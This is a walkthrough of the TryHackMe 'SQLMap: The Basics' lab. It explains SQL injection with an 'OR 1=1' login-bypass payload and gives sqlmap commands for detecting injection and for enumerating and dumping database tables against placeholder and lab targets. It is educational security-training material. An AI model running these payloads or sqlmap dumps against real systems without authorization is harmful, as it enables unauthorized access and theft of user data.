# 💉 TryHackMe - SQLMap: The Basics (Highly Detailed Walkthrough)

This markdown provides a comprehensive guide to the **SQLMap: The Basics** room on TryHackMe. It introduces the concept of SQL Injection, how SQLMap automates vulnerability detection and exploitation, and offers hands-on steps to practice.

---

## 🧠 Task 1 - Introduction to SQL Injection


### 🖼️ Visualizing the SQL Injection Process

#### 1️⃣ User sends input (vulnerable GET request)
![SQLi Step 1](https://github.com/user-attachments/assets/63f89df6-6a6d-4c1e-8d1a-551de4ea1580)

#### 2️⃣ Web server constructs SQL query
![SQLi Step 2](https://github.com/user-attachments/assets/08266320-2c90-4f28-bbdb-f691e28b9f3f)

#### 3️⃣ Database responds to query
![SQLi Step 3](https://github.com/user-attachments/assets/299f5122-9506-4b04-9df1-1ba9e02700d8)

#### 4️⃣ Web server returns results to user
![SQLi Step 4](https://github.com/user-attachments/assets/fda3b8d6-89da-4a5e-a568-de56e271633b)


### 🧾 What is a Database?
- A **database** stores structured data for applications.
- DBMS (Database Management Systems) include:
  - MySQL, PostgreSQL, SQLite, Microsoft SQL Server

Web apps use SQL queries to:
- Authenticate users (login)
- Search content (bookshop, profiles, etc.)

### 🔐 Where Does SQL Come In?

Example login query:
```sql
SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
```

---

## 🚨 Task 2 - SQL Injection Vulnerability


### 🖼️ Visual Representation of SQL Injection

![SQL Injection Illustration](https://github.com/user-attachments/assets/f6fa1623-1211-40f6-af86-d2f234282690)


### 🧨 How SQL Injection Works

SQL Injection (SQLi) occurs when **unsanitized input** is embedded into an SQL query.

#### ✅ Legitimate Login
```sql
SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
```

#### 🚩 Malicious Login
```
Username: John
Password: abc' OR 1=1;-- -
```

Query becomes:
```sql
SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
```

### 🔎 Why Does This Work?

- `1=1` is always TRUE
- `--` comments out the rest
- Result: attacker logs in without valid credentials

### ⚠️ Real-World Impact

- Access sensitive user data
- Modify/delete records
- Execute administrative actions
- Possible remote code execution (with stacked queries)

---

## 🤖 Task 3 - Using SQLMap (Automated SQLi Tool)

### 📦 What is SQLMap?

**SQLMap** is an open-source CLI tool to:
- Detect SQL injection vulnerabilities
- Extract data from DBMS (MySQL, PostgreSQL, MSSQL, etc.)
- Automate the exploitation process

### 🔧 Basic Scan Example

Test URL using a vulnerable GET parameter:
```bash
sqlmap -u 'http://example.com/search?cat=1'
```

SQLMap checks:
- WAF presence
- DBMS type
- Parameter behavior (dynamic/static)
- Vulnerability types (error-based, blind, union)

---

### 🧪 Discovered Injection Types (Sample Output)

| Type                | Description |
|---------------------|-------------|
| Boolean-based Blind | Uses logic (e.g. `AND 1=1`) |
| Error-based         | Forces SQL errors for data |
| Time-based Blind    | Uses delays (e.g. `SLEEP(5)`) |
| UNION-based         | Joins injected result with real query |

---

### 🔍 Extracting Databases

```bash
sqlmap -u 'http://example.com/search?cat=1' --dbs
```

Output:
```
[*] users
[*] members
```

---

### 📑 Extracting Tables from a Database

```bash
sqlmap -u 'http://example.com/search?cat=1' -D users --tables
```

Output:
```
[*] thomas
[*] johnath
[*] alexas
```

---

### 📥 Dumping Table Data

```bash
sqlmap -u 'http://example.com/search?cat=1' -D users -T thomas --dump
```

Output:
```
+---------------------+------------+---------+
| Date                | name       | pass    |
+---------------------+------------+---------+
| 09/09/2024          | Thomas THM | testing |
+---------------------+------------+---------+
```

SQLMap can also detect and attempt to crack password hashes!

---

### ⚙️ Wizard Mode (Interactive CLI for Beginners)

```bash
sqlmap --wizard
```

Prompts:
- Target URL
- Injection point
- Output format
- What to extract (databases, tables, columns)

---

### ✉️ POST-Based SQLi (Request Interception)

1. Capture POST request with Burp Suite or browser dev tools
2. Save as `intercepted_request.txt`

```bash
sqlmap -r intercepted_request.txt
```

---

### 🔍 Advanced Options

| Flag         | Function |
|--------------|----------|
| `--dbs`      | List all databases |
| `-D`         | Specify target database |
| `--tables`   | List tables in DB |
| `-T`         | Specify target table |
| `--columns`  | List table columns |
| `--dump`     | Extract content |
| `--level=5`  | In-depth testing (default is 1) |
| `--risk=3`   | More aggressive payloads |
| `--batch`    | Auto-answer prompts |

---

## 🧪 Task 4 - Practical Hands-On


### 🖼️ Intercepting the Vulnerable Request

#### 🔐 Step 1: Login Page
![SQLMap Login Page](https://github.com/user-attachments/assets/29361d57-5de3-4ad6-8692-6b8fed609f1c)

#### 📥 Step 2: Captured GET Request in DevTools
![SQLMap DevTools Capture](https://github.com/user-attachments/assets/80261451-3e7b-427e-a394-3a4c668461b4)


### 🧩 Vulnerable Page:
```
http://MACHINE_IP/ai/login
```

Use developer tools to inspect GET request:
```
http://MACHINE_IP/ai/includes/user_login?email=test&password=test
```

### 🔍 Test with SQLMap:
```bash
sqlmap -u 'http://MACHINE_IP/ai/includes/user_login?email=test&password=test' --level=5
```

### ⚠️ When Prompted, Answer:
- Skip non-MySQL tests? → y
- Extend risk tests? → y
- Try integer for union-char? → y
- Keep testing other params? → n

---

## ✅ Summary

### 📌 SQL Injection Lifecycle:
| Step | Action |
|------|--------|
| 1. Identify | Find GET/POST parameters |
| 2. Test     | Try `' OR 1=1--` manually |
| 3. Automate | Use SQLMap for detection |
| 4. Extract  | Use `--dbs`, `--tables`, `--dump` |
| 5. Harden   | Use prepared statements and validation |

---

## 📚 References

- [TryHackMe SQLMap Room](https://tryhackme.com/room/sqlmap)
- [SQLMap Tool Official Site](http://sqlmap.org/)
- [OWASP SQLi Guide](https://owasp.org/www-community/attacks/SQL_Injection)
- [PayloadsAllTheThings - SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings)
